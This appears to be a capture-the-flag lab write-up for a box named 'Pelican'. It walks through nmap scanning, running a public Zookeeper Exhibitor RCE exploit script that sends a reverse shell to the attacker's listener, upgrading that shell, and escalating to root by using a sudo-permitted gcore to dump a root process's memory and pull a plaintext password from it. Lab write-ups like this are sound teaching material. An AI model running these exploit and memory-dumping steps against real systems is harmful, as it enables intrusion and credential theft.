---
description: udo gcore to dump root process memory
icon: linux
---

# Pelican

## Summary&#x20;

* Identified Zookeeper Exhibitor dashboard on port `8080`, known to be vulnerable to remote command execution.
* Used public exploit to gain shell access as `charles`.
* Privilege escalation achieved via `sudo gcore` — dumped memory of a `root` process and recovered the root password.

## 🧵 Let's Unpack

***

#### 🔎 Enumeration

**Nmap Full TCP Scan**

```bash
nmap -p- -T5 192.168.167.98 -vv
# Extracted ports:
22,139,445,631,2181,2222,8080,8081,44505
```

**Nmap Service Enumeration**

```bash
sudo nmap -A -sC -sN -oN nmapFull -p 22,139,445,631,2181,2222,8080,8081,44505 192.168.167.98
```

* Two SSH ports: `22` and `2222` (both OpenSSH 7.9p1)
* Samba services on `139` and `445`
* CUPS on `631` with PUT method allowed
* **Zookeeper Exhibitor** interface discovered on port `8080`
* Port `8081` redirects to `8080/exhibitor/v1/ui/index.html`
* Port `44505` was open|filtered (tcpwrapped)

***

#### 🚪 Initial Foothold

**Exploit Used**: [Exhibitor-RCE](https://github.com/thehunt1s0n/Exihibitor-RCE/blob/main/exploit.sh)

```bash
./exploit.sh 192.168.167.98 8080 192.168.45.175 4444
nc -nlvp 4444
# Received reverse shell as user: charles
```

**Upgraded to a PTY shell:**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

***

#### 🔐 Privilege Escalation

Checked sudo permissions:

<pre class="language-bash"><code class="lang-bash"><strong>sudo -l
</strong>> 
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore

# priv excalation 
sudo gcore $pid # to dump memoery of the process that might have password

# User 'charles' can run /usr/bin/gcore without a password
</code></pre>

Identified an interesting root-owned process:

```bash
ps auxwww | grep password
root     496  0.0  0.0   2276    72 ?  Ss   05:09   0:00 /usr/bin/password-store
```

Used `gcore` to dump memory of the root process:

```bash
sudo gcore 496
# Dump saved as core.496
strings core.496 | less
# Found credentials:
001 Password: root:
ClogKingpinInning731
```

Switched to root:

```bash
su root
# 🎉 Boom! Root shell!
```

***

### ☠️ Gotcha!

> Zookeeper Exhibitor UIs exposed without auth and `gcore` sudo misconfigs are a **root access recipe** waiting to be abused.
